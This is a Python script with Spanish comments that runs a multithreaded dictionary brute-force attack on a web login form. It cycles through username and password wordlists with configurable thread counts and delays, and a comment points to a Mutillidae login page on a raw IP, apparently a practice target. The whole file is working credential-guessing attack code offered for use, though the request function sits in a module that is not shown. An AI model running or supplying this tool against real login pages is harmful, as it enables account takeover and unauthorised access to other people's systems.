import parametros as params
import func
from concurrent.futures import ThreadPoolExecutor
from colorama import init,Fore
from time import sleep

init()


#http://128.198.49.198:8102/mutillidae/index.php?page=login.php

try:
    
    # parametros utilizados por defecto
    if params.param.c_u != None:
        c_usuario = params.param.c_u
    else:
        c_usuario = 'username'

    if params.param.c_c != None:

        c_contraseña = params.param.c_c
    else:
        c_contraseña = 'password'

    if params.param.n != None:
        n = params.param.n
    else:
        n = 0

    if params.param.hilos != None:
        if params.param.hilos <= 16:
            hilo = params.param.hilos
        else:
            print(Fore.YELLOW+'cantidad de hilos mayor a 16 no es recomendable')
            hilo = 16
    else:
        hilo = 16

    if params.param.delay != None:
        d = params.param.delay
    else:
        d = 0
    #-------------------------------------

    print(f'hilos: {hilo}')
    #conozco el usuario
    if params.param.usuario != None and params.param.dic_u == None:
        
        lista= func.leer_dic(params.param.dic_c).split()
        
        
        with ThreadPoolExecutor(max_workers=hilo) as ejec:
            for cont in reversed(lista):
            
                if not func.deteniendo:
                    if not func.esperando:
                        f =ejec.submit(func.fb,url_login=params.param.url,usuario=params.param.usuario,c_usuario=c_usuario,c_contr=c_contraseña,contr_=cont,n=n)
                        
                        lista.remove(cont)
                        sleep(d) 
                    else:
                        print(Fore.WHITE+f'no se pudo enviar {cont}')
                        continue
                else:
                    ejec.shutdown(wait=False,cancel_futures=True)
                    break
       
    #no conozco el usuario 
    elif params.param.dic_u != None and params.param.usuario == None:
        
    
        dic_usuario = func.leer_dic(params.param.dic_u).split()
        
        
        with ThreadPoolExecutor(max_workers=hilo) as ejec:
            
            for usuario  in reversed(sorted(dic_usuario)):
                
                if not func.deteniendo:
                    dic_contr= func.generador(params.param.dic_c)

                    for cont  in dic_contr:
                        if dic_contr != 'error':
                            
                            ejec.submit(func.fb,url_login=params.param.url,usuario=usuario,c_usuario=c_usuario,c_contr=c_contraseña,contr_=cont,n=n)
                            sleep(d)
                        else:
                            func.deteniendo = True    
                else:
                    ejec.shutdown(wait=False,cancel_futures=True)
                    break
                    
                dic_usuario.remove(usuario)    
                          
except KeyboardInterrupt:
    func.deteniendo = True
    exit()
except AttributeError:
    pass

